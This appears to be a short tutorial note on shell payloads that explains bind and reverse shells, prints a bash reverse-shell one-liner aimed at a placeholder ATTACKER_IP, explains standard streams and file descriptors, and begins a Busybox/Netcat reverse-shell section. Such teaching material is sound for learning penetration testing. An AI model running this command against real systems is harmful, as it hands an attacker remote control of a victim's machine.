A shell payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or send a connection in the case of a reverse shell.

### Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

This reverse shell initiates an interactive shell that redirects input and output through a TCP connection to the attacker's IP, on port 443. The >& operator combines both standard output and standard error.

>> When a program runs in Linux, it automatically has 3 communication channels attached to it.
>> **Standard Input** - This is what goes INTO the program. When you type a command and press Enter, you're sending input to the program.
>
>**Standard  Output** - This is the program's normal output. Regular results, Expected responses, Success messages. When you run ls, the list of file you see is the stdout.
>
>**Standard Error (stderr**)  - This is the program's error output. Warnings, errors, things that went wrong.

Linux treats stderr and stdout as separate streams so you have control.

**File Descriptors** 

```bash
stdin - 0
stdout - 1
stderr - 2
```



#### Busybox

This reverse shell uses Netcat to connect to the attacker. Once connected it executes /bin/sh, exposing command line to the attacker.